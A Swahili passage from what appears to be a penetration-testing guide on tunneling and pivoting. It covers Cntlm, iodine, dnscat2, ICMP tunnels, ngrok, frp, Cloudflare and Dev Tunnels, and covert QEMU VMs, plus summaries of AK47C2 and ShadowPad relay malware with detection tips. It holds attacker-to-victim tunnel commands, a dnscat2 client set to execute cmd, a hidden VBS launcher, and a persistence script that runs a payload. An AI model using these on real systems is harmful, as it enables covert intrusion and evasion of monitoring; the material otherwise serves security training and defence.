Sasa unaweza kutumia [**Proxifier**](https://www.proxifier.com/) kuelekeza traffic kupitia port hiyo.<sup>[[26]](#references)</sup>

### Uwindaji wa virtual-channel za RDP

[`rdp2tcp`](../network-services-pentesting/pentesting-rdp.md#rdp-virtual-channel-tunneling) ni tunnel nyingine ya virtual-channel ya RDP; jina lake la channel chaguomsingi ni `rdp2tcp`, ingawa operator anaweza kuchagua jina tofauti.<sup>[[56]](#references)</sup> Uundaji na ufungaji wa channel huandikwa kwenye `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational` kama event IDs **132** na **148**. Tafuta `rdp2tcp` na majina ya channel yasiyo ya kawaida au ya nasibu, kisha yalinganishe na channel zinazotarajiwa kama `XPSRD`, `cliprdr`, na `Microsoft::Windows::RDS::DisplayControl`.<sup>[[58]](#references)</sup>

## Kuelekeza trafiki ya programu za GUI za Windows kupitia proxy

Unaweza kufanya programu za GUI za Windows ziunganishe kupitia proxy kwa kutumia [**Proxifier**](https://www.proxifier.com/).<sup>[[26]](#references)</sup>\
Katika **Profile -> Proxy Servers**, ongeza IP na port ya seva ya SOCKS.\
Katika **Profile -> Proxification Rules**, ongeza jina la programu unayotaka kuelekeza kupitia proxy na miunganisho kwenye IP unazotaka kuelekeza kupitia proxy; sheria za Proxifier zinaweza kulinganisha programu, host lengwa, na port.<sup>[[27]](#references)</sup>

## Tunneling kupitia NTLM proxy

Zana iliyotajwa awali, **Rpivot**, inaweza kuelekeza trafiki kupitia proxy inayothibitisha kwa NTLM. **OpenVPN** pia inaweza kuelekeza trafiki kupitia proxy hiyo ikisanidiwa kwa auth file na mbinu ya NTLMv2; huu ni upitishaji kupitia proxy, si kukwepa uthibitishaji wa proxy.<sup>[[20]](#references)[[28]](#references)</sup>

```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```

### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm hujithibitisha kwa proksi za NTLM za upstream, hufichua listeners za ndani, na inaweza kuunganisha port ya tunnel ya ndani na huduma lengwa; kisha clients wanaweza kutumia port hiyo ya ndani.<sup>[[29]](#references)</sup>\
Kwa mfano, forward port 443 hiyo.

```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```

Sasa, ukiweka kwa mfano huduma ya **SSH** kwenye mashine lengwa isikilize kwenye port 443, unaweza kuunganishwa nayo kupitia port 2222 ya mshambuliaji.<sup>[[29]](#references)</sup>\
Unaweza pia kutumia **meterpreter** inayounganishwa na localhost:443 huku mshambuliaji akisikiliza kwenye port 2222.<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) ni zana ya Microsoft ya .NET ya reverse proxy. Unaweza kuipata hapa: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine huunda tunnel ya IPv4 kupitia maombi ya DNS na hutumia violesura vya TUN; usanidi ulioandikwa unahitaji ruhusa zinazohitajika kuunda violesura hivyo kwenye ncha zote mbili.<sup>[[31]](#references)</sup>

```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```

DNS transport ina gharama ya ziada kuliko TCP ya moja kwa moja na kwa kawaida huwa polepole; unaweza kuunda muunganisho wa SSH uliobanwa kupitia handaki hili kwa kutumia:<sup>[[31]](#references)</sup>

```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

[**Pakua hapa**](https://github.com/iagox86/dnscat2)**.**

Dnscat2 huanzisha channel iliyosimbwa kwa njia fiche ya command-and-control kupitia DNS; amri za server na client zilizo hapa chini zinafuata matumizi yaliyoandikwa kwenye nyaraka zake.<sup>[[32]](#references)</sup>

```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```

#### **Katika PowerShell**

Unaweza kutumia [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) kuendesha client ya dnscat2 katika PowerShell; README yake inaeleza vigezo vya `Start-Dnscat2` vilivyoonyeshwa hapa chini.<sup>[[33]](#references)</sup>

```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```

#### **Port forwarding kwa dnscat**

Amri ya `listen` ya dnscat2 huunganisha listener ya ndani na host na port ya mbali.<sup>[[32]](#references)</sup>

```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```

#### Badilisha DNS ya proxychains

Proxychains-ng hu-hook miunganisho ya TCP iliyounganishwa kwa nguvu na haiwezi kubeba UDP au ICMP; uelekezaji wa DNS kupitia proxy unaweza kusanidiwa, kwa hiyo kagua `proxychains.conf` iliyosakinishwa na helper ya resolver badala ya kudhani kuna resolver ya umma iliyowekwa maalum. Skripti za zamani za `proxyresolv` hufichua `PROXY_DNS_SERVER` ili kuchagua resolver; tumia resolver inayoweza kufikiwa kutoka kwenye pivot inapohitajika majina ya ndani.<sup>[[34]](#references)[[35]](#references)</sup>

## Tunnels katika Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Mhusika wa Storm-2603 aliunda **dual-channel C2 ("AK47C2")** inayotumia vibaya trafiki ya **DNS** inayotoka na **plain HTTP POST** pekee—protokali mbili ambazo hazizuiwi mara nyingi kwenye mitandao ya kampuni.<sup>[[2]](#references)</sup>

1. **DNS mode (AK47DNS)**
   • Huzalisha SessionID ya nasibu yenye herufi 5 (k.m. `H4T14`).  
   • Huongeza `1` mwanzoni kwa *maombi ya kazi* au `2` kwa *matokeo* na kuunganisha sehemu tofauti (flags, SessionID, jina la kompyuta).  
   • Kila sehemu **husimbwa kwa XOR kwa kutumia ufunguo wa ASCII `VHBD@H`**, hubadilishwa kuwa hex, kisha huunganishwa kwa nukta—na hatimaye kumalizika kwa domain inayodhibitiwa na mshambuliaji:

   ```text
   <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
   ```

   • Maombi hutumia `DnsQuery()` kwa rekodi za **TXT** (na **MG** kama njia mbadala).  
   • Jibu linapozidi baiti 0xFF, backdoor hugawanya data katika vipande vya baiti 63 na kuingiza alama:
     `s<SessionID>t<TOTAL>p<POS>` ili seva ya C2 iweze kuvipanga upya.

2. **Hali ya HTTP (AK47HTTP)**
   • Hutengeneza bahasha ya JSON:
   ```json
   {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
   ```
   • Blob nzima inafanyiwa XOR-`VHBD@H` → hex → hutumwa kama body ya **`POST /`** yenye header `Content-Type: text/plain`.
   • Jibu hutumia encoding ileile, na field ya `cmd` hutekelezwa kwa `cmd.exe /c <command> 2>&1`.

Maelezo ya Blue Team
• Tafuta **TXT queries** zisizo za kawaida ambazo label yake ya kwanza ina hexadecimal ndefu na kila mara huishia kwenye domain moja isiyo ya kawaida.  
• Ufunguo wa XOR usiobadilika unaofuatwa na ASCII-hex ni rahisi kutambua kwa YARA: `6?56484244?484` (`VHBD@H` katika hex).  
• Kwa HTTP, weka alama kwenye POST bodies za text/plain ambazo zina hex tupu na urefu wake ni mgawo wa bytes mbili.

{{#note}}
Channel hii huweka kila sub-domain label ndani ya kikomo cha DNS cha okteti 63, lakini kufuata itifaki pekee hakuifanyi isiweze kutambuliwa; domains adimu, labels ndefu za hexadecimal, na wingi wa queries bado ni ishara za kutambua.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans inaeleza tunnel ya IPv4-over-ICMP inayotumia kifaa cha TUN na ICMP echo requests; usanidi wake unahitaji ruhusa za kutosha kuunda interface.<sup>[[37]](#references)</sup>

```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```

### ptunnel-ng

[**Pakua hapa**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng husafirisha miunganisho ya TCP kupitia ICMP na hutumia chaguo za `-p`, `-l`, `-r`, na `-R` zilizoonyeshwa hapa chini kwa proksi, local listener, host lengwa, na port lengwa.<sup>[[38]](#references)</sup>

```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```

## ngrok

[**ngrok**](https://ngrok.com/) ni agent ya kuweka huduma za mtandao za ndani mtandaoni kupitia tunnel salama; CLI yake huandika endpoint za HTTP, TCP na URL za faili, na hostname ya endpoint inayoonyeshwa inaweza kutofautiana kulingana na endpoint na akaunti.<sup>[[39]](#references)</sup>

### Installation

- Fungua akaunti: https://ngrok.com/signup
- Pakua client:

```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```

### Matumizi ya msingi

**Nyaraka:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Agent pia inasaidia chaguo za uthibitishaji na TLS inapohitajika.<sup>[[39]](#references)</sup>_

#### Tunneling TCP

```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```

#### Kufichua faili kupitia HTTP

```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```

#### Kunasa simu za HTTP

_Useful kwa XSS,SSRF,SSTI ..._\
Agent inayojitegemea hufichua kiolesura chake cha ukaguzi wa HTTP katika `http://127.0.0.1:4040` kwa chaguomsingi; kiolesura hiki ni cha trafiki ya HTTP.<sup>[[40]](#references)</sup>

#### Kuweka handaki kwa huduma ya ndani ya HTTP

Chaguo la `--host-header=rewrite` huandika upya kichwa cha HTTP `Host` cha upstream ili kilingane na huduma ya ndani.<sup>[[41]](#references)</sup>

```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```

#### mfano rahisi wa usanidi wa ngrok.yaml

Hii hutumia ngrok Agent Config v2; tunnels zenye majina hutumia `proto` na `addr` na huanzishwa kwa `ngrok start`.<sup>[[42]](#references)</sup> Hufungua tunnels 3:

- 2 TCP
- 1 HTTP yenye utoaji wa faili tuli kutoka /tmp/httpbin/

```yaml
version: 2
tunnels:
  mytcp:
    addr: 4444
    proto: tcp
  anothertcp:
    addr: 5555
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```

## Microsoft Dev Tunnels

Microsoft Dev Tunnels zinaweza kuchapisha huduma ya ndani inayotumia TCP kupitia miundombinu ya relay ya Microsoft. CLI ya host huunda tunnel inayotoka, huku `devtunnel connect` ikiunda upya port iliyohostiwa kwenye client; kwa chaguomsingi, tunnel zinahitaji uthibitishaji, isipokuwa vidhibiti vya ufikiaji vipunguzwe makusudi.<sup>[[55]](#references)[[58]](#references)</sup>

```bash
# Compromised/pivot host: publish its local RDP service
# Save the tunnel ID printed by this command
devtunnel host -p 3389

# Operator host: authenticate as an authorized tunnel user and create
# a local 127.0.0.1:3389 forward to the hosted port
devtunnel connect <TUNNEL_ID>
xfreerdp /u:<USER> /v:127.0.0.1:3389
```

Hii inaweza kufichua RDP kupitia `*.devtunnels.ms` bila kufungua listener mpya inayoingia kwenye perimeter. Inaweza pia kuunganishwa na RDP virtual-channel tunnel kama `rdp2tcp`, na kugeuza kipindi cha RDP kuwa pivot ya hatua ya pili kwa trafiki ya TCP ya aina yoyote.<sup>[[58]](#references)</sup>

Kwa hunting, linganisha utekelezaji wa Dev Tunnels CLI na trafiki ya DNS/TLS kwenda `*.devtunnels.ms` pamoja na matukio yasiyotarajiwa ya RDP virtual-channel. Tunnel iliyoidhinishwa si salama kwa sababu tu inatumia relay inayomilikiwa na Microsoft.<sup>[[58]](#references)</sup>

## Cloudflared (Cloudflare Tunnel)

Kiunganishi cha Cloudflare Tunnel, `cloudflared`, huanzisha miunganisho inayotoka; programu zilizochapishwa zinaweza kuelekeza HTTP, HTTPS, TCP, SSH na RDP, ilhali quick tunnels zimekusudiwa kwa uundaji wa HTTP.<sup>[[43]](#references)[[45]](#references)</sup>

### Amri ya mstari mmoja ya Quick tunnel

```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```

### Asili ya SOCKS5 (hali ya urithi)

Alama ya zamani `--socks5` huiambia `cloudflared` kwamba asili ya ndani hutumia SOCKS5; haiundi kisikilizaji cha ndani cha SOCKS5. Kwa tunnel inayosimamiwa, `originRequest.proxyType: socks` husanidi ushughulikiaji wa asili ya SOCKS5.<sup>[[44]](#references)</sup>

```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```

### Tunnel zinazoendelea kupitia DNS

Usanidi wa tunnel unaosimamiwa ndani ya mfumo hutumia keys za herufi ndogo `tunnel`, `credentials-file`, na `url`, kama inavyoonyeshwa hapa chini.<sup>[[46]](#references)</sup>

```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```

Anzisha kiunganishi:

```bash
cloudflared tunnel run mytunnel
```

Kiunganishi huanzisha miunganisho ya kutoka nje na, kwa chaguo-msingi, hujadiliana kutumia QUIC na kubadili hadi HTTP/2 ikishindikana; usidhani kwamba kila deployment hutumia TCP/443. Kiendeshe kwa ruhusa zinazohitajika tu na deployment yako.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) ni reverse proxy ya Go inayotumia **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX, na XTCP**. XTCP hutumia P2P hole punching, ambayo mafanikio yake hutegemea NAT. Kuanzia **v0.53.0**, inaweza kufanya kazi kama **SSH Tunnel Gateway**, kwa hivyo host lengwa inaweza kutumia OpenSSH client ya kawaida bila binary ya `frpc`.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Tunnel ya kawaida ya reverse TCP

```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```

### Kutumia gateway mpya ya SSH (bila binary ya frpc)

```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```

Amri iliyo hapo juu inachapisha port **8080** ya victim kama **attacker_ip:9000** kwa kutumia OpenSSH client ya kawaida, huku `frps` ikitoa gateway.<sup>[[50]](#references)</sup>

## Tunnels za Covert zinazotumia VM pamoja na QEMU

QEMU user-mode networking haihitaji root au ruhusa za msimamizi kwa mtandao wa virtual, na `-netdev user,hostfwd=...` huelekeza miunganisho ya TCP, UDP, au UNIX kutoka host kwenda guest.<sup>[[51]](#references)</sup> TrustedSec iliandika kuhusu QEMU VM ya Tiny Core na jaribio la reverse SSH tunnel katika tukio ambapo EDR inayolenga host ingeweza kukosa kuona shughuli ndani ya guest.<sup>[[1]](#references)</sup>

### Amri fupi ya mstari mmoja

```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
   -m 256M ^
   -drive file=tc.qcow2,if=ide ^
   -netdev user,id=n0,hostfwd=tcp::2222-:22 ^
   -device e1000,netdev=n0 ^
   -nographic
```

• Amri iliyo hapo juu huwasha guest ya **Tiny Core Linux** yenye kumbukumbu ya guest ya 256 MiB na image ya diski ya qcow2; image ya diski si diski iliyo kwenye RAM.
• Port **2222/tcp** kwenye host ya Windows husambazwa kwa uwazi hadi **22/tcp** ndani ya guest.
• Kwa mtazamo wa mshambuliaji, target hufichua tu port 2222; pakiti zozote zinazoifikia hushughulikiwa na seva ya SSH inayoendeshwa kwenye VM.

### Kuwasha kwa siri kupitia VBScript

TrustedSec iliona QEMU ikiwashwa kupitia VBS na images za Tiny Core kwenye tukio lililotajwa hapo juu.<sup>[[1]](#references)</sup>

```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```

Kuendesha script kwa `cscript.exe //B update.vbs` huficha dirisha.<sup>[[1]](#references)</sup>

### Kudumisha ufikiaji ndani ya guest

Tukio lililotajwa linaeleza kudumisha ufikiaji ndani ya guest ya Tiny Core isiyohifadhi hali kupitia `/opt/bootlocal.sh` na `/opt/filetool.lst`:<sup>[[1]](#references)</sup>

1. Weka payload kwenye `/opt/123.out`  
2. Ongeza kwenye `/opt/bootlocal.sh`:

   ```sh
   while ! ping -c1 45.77.4.101; do sleep 2; done
   /opt/123.out
   ```

3. Ongeza `home/tc` na `opt` kwenye `/opt/filetool.lst` ili payload ijumuishwe kwenye `mydata.tgz` wakati wa shutdown.

### Mambo ya kuzingatia kuhusu telemetry

• Host bado huonyesha mchakato wa QEMU, picha ya qcow2 na listener yoyote iliyoforwardiwa na host.  
• Uchunguzi wa michakato unaofanywa na host pekee huenda usikague michakato ya guest, lakini virtualization haihakikishi evasion; telemetry ya mtandao, QEMU na picha bado inaweza kufichua shughuli hiyo.<sup>[[1]](#references)[[51]](#references)</sup>

### Vidokezo kwa watetezi

• Toa tahadhari kuhusu **binaries zisizotarajiwa za QEMU/VirtualBox/KVM** katika paths ambazo watumiaji wanaweza kuandika.  
• Zuia miunganisho ya nje inayotoka kwenye `qemu-system*.exe`.  
• Tafuta ports adimu zinazosikiliza (2222, 10022, …) na kuanza kufungwa mara tu baada ya QEMU kuzinduliwa.

## IIS/HTTP.sys relay nodes kupitia `HttpAddUrl` (ShadowPad)

Check Point inaeleza kuwa moduli ya IIS ya ShadowPad hugeuza web servers zilizoathiriwa kwenye perimeter kuwa backdoor na relay nodes kwa kufunga prefixes za URL kupitia `HttpAddUrl`.<sup>[[3]](#references)</sup>

Ripoti hiyo hiyo inaeleza defaults, wildcard listeners, decryption ya pakiti, relay queues na telemetry ya utatuzi iliyofupishwa hapa chini.<sup>[[3]](#references)</sup>

* **Defaults za config** – ikiwa config ya JSON ya moduli haijajumuisha thamani, moduli hutumia defaults za IIS zinazoaminika (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Hivyo, IIS hujibu traffic isiyo hasidi kwa branding sahihi.
* **Uingiliaji wa wildcard** – waendeshaji hutoa orodha ya prefixes za URL zilizotenganishwa kwa semicolon (wildcards kwenye host + path). Moduli huita `HttpAddUrl` kwa kila entry, kwa hivyo HTTP.sys huelekeza requests zinazolingana kwa handler hasidi; requests zisizolingana hurudi kwenye tabia ya kawaida ya IIS.
* **Pakiti ya kwanza iliyosimbwa kwa njia fiche** – bytes mbili za kwanza za request body hubeba seed ya PRNG maalum ya 32-bit. Kila byte inayofuata hufanyiwa XOR na keystream inayozalishwa kabla ya kuchanganua protocol:

  ```python
  def decrypt_first_packet(buf):
      seed = buf[0] | (buf[1] << 8)
      num = seed & 0xFFFFFFFF
      out = bytearray(buf)
      for i in range(2, len(out)):
          hi = (num >> 16) & 0xFFFF
          num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
          out[i] ^= num & 0xFF
      return out
  ```

* **Uratibu wa relay** – moduli hudumisha orodha mbili: “servers” (nodi za juu) na “clients” (implants za chini). Maingizo huondolewa ikiwa hakuna heartbeat inayofika ndani ya takriban sekunde 30. Orodha zote mbili zinapokuwa na maingizo, huunganisha server ya kwanza iliyo hai na client ya kwanza iliyo hai, kisha hupitisha bytes kati ya sockets zao hadi upande mmoja ufungwe.
* **Telemetry ya utatuzi** – uwekaji kumbukumbu wa hiari huhifadhi IP ya chanzo, IP ya lengwa na jumla ya bytes zilizopitishwa kwa kila muunganisho. Wachunguzi walitumia vidokezo hivyo kujenga upya mesh ya ShadowPad iliyovuka wahasiriwa wengi.

---

## Zana nyingine za kukagua

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Kujificha Gizani: Tunnels Fiche kupitia Uboreshaji wa QEMU](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Kabla ya ToolShell: Kuchunguza Operesheni za Awali za Ransomware za Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Ndani ya Ink Dragon: Kufichua Mtandao wa Relay na Utendaji wa Ndani wa Operesheni Fiche ya Kukera](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [README ya Evil-WinRM](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Mwongozo wa Marejeo wa Nmap: Kukwepa Vikwazo vya Firewall/IDS](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [Mwongozo wa ssh wa OpenBSD](https://man.openbsd.org/ssh)
- [7] [Mwongozo wa sshd_config wa OpenBSD](https://man.openbsd.org/sshd_config)
- [8] [Vidokezo vya toleo la OpenSSH 9.6](https://www.openssh.org/txt/release-9.6)
- [9] [README ya sshuttle](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Pivoting katika Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Nyaraka za moduli ya socks_proxy ya Metasploit](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Nyaraka za moduli ya autoroute ya Metasploit](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [README ya reGeorg](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [README ya Chisel](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Mwongozo wa Kuanza Haraka wa Ligolo-ng](https://docs.ligolo.ng/Quickstart/)
- [18] [Listeners za Ligolo-ng](https://docs.ligolo.ng/Listeners/)
- [19] [Localhost ya Ligolo-ng](https://docs.ligolo.ng/Localhost/)
- [20] [README ya rpivot](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [Mwongozo wa socat](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [Mwongozo wa PuTTY Plink](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [Chaguo za mstari wa amri za PuTTY](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Amri ya Microsoft netsh interface portproxy](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [README ya SocksOverRDP](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Nyaraka za Proxifier](https://www.proxifier.com/docs/win-v4/)
- [27] [Kanuni za Proxification za Proxifier](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [Mwongozo wa OpenVPN 2.7](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [README ya YARP](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [README ya iodine](https://code.kryo.se/iodine/README.html)
- [32] [README ya dnscat2](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [README ya dnscat2-powershell](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [README ya proxychains-ng](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: Majina ya Vikoa - Utekelezaji na Uainishaji](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [README ya ptunnel-ng](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [CLI ya ngrok Agent](https://ngrok.com/docs/agent/cli)
- [40] [Kiolesura cha Ukaguzi wa Wavuti cha ngrok](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [Virtual hosts za ngrok](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [Usanidi wa ngrok Agent v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Muhtasari wa Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/)
- [44] [Vigezo vya origin vya Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Usanidi wa Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Faili ya usanidi wa Cloudflare Tunnel](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Vigezo vya uendeshaji wa Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [Dhana za frp](https://gofrp.org/en/docs/concepts/)
- [49] [XTCP ya frp](https://gofrp.org/en/docs/features/xtcp/)
- [50] [Lango la SSH Tunnel la frp](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [Nyaraka za mitandao ya QEMU](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [README ya wstunnel](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [Hazina ya msimbo wa NetSPI BOFScale](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale: Tailnet Inayopitia CDN kutoka kwa BOF-PE](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
- [55] [Microsoft Learn - Amri za CLI za Dev Tunnels](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/cli-commands)
- [56] [V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
- [57] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [58] [APT ya NightEagle: GhostContainer na Tunneling](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
{{#include ../banners/hacktricks-training.md}}
